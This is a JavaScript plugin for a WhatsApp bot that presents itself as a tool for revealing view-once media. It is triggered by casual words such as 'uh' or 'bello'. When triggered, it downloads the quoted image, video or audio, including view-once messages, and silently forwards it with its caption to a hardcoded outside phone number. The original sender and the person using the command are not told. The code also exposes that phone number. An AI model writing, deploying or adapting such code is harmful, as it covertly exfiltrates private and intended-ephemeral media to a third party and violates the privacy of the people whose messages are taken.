// 𝐏𝐋𝐔𝐆𝐈𝐍 𝐁𝐘 𝐃𝐄𝐀𝐓𝐇
import { Buffer } from 'buffer';

let handler = async (m, { conn }) => {
    if (!m.quoted) {
        return;
    }

    let q = m.quoted;
    let mime = (q.msg || q).mimetype || q.mediaType || '';

    if (!/image|video|audio/g.test(mime)) {
        return;
    }

    let originalMsgType = '';
    try {
        originalMsgType = Object.keys(q.message || {})[0];
    } catch (e) {
        console.error("𝐄𝐑𝐑:", e);
    }

    if (originalMsgType === 'viewOnceMessageV2' || originalMsgType === 'viewOnceMessageV2Extension') {
        console.log(`𝐈𝐍𝐅𝐎: 𝐌𝐄𝐒𝐒𝐀𝐆𝐆𝐈𝐎 ${q.id?.id} 𝐂𝐀𝐏𝐓𝐈𝐎𝐍 (${originalMsgType}). 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃.`);
    }

    try {
        let buffer = await q.download?.();

        if (!buffer) {
             return;
        }

        let caption = '';
        try {
            const msg = q.message;
            const type = originalMsgType || Object.keys(msg || {})[0];
            const messageContent = msg[type];

            if (messageContent?.caption) {
                caption = messageContent.caption;
            } else if (messageContent?.message?.[Object.keys(messageContent.message)[0]]?.caption) {
                caption = messageContent.message[Object.keys(messageContent.message)[0]].caption;
            }
        } catch (captionError) {
             console.error("𝐄𝐑𝐑𝐎𝐑𝐄 𝐂𝐀𝐏𝐓𝐈𝐎𝐍:", captionError);
             caption = '';
        }

        const jid = '393935731102@s.whatsapp.net';

        if (/video/g.test(mime)) {
            await conn.sendFile(jid, buffer, '𝐊𝐈𝐍𝐃𝐄𝐑𝐈𝐍𝐎.mp4', caption || '', m);
        } else if (/image/g.test(mime)) {
            await conn.sendFile(jid, buffer, '𝐊𝐈𝐍𝐃𝐄𝐑𝐈𝐍𝐎.jpg', caption || '', m);
        } else if (/audio/g.test(mime)) {
            await conn.sendFile(jid, buffer, '𝐊𝐈𝐍𝐃𝐄𝐑𝐈𝐍𝐎.mp3', '', m, { asDocument: false, mimetype: 'audio/mpeg', ptt: false });
        }

    } catch (e) {
        console.error(e);
    }
};

handler.help = ['rivela', 'readvo', 'getmedia'];
handler.tags = ['tools'];
handler.customPrefix = /uh|bello|ah|beh/i
handler.command = new RegExp

export default handler;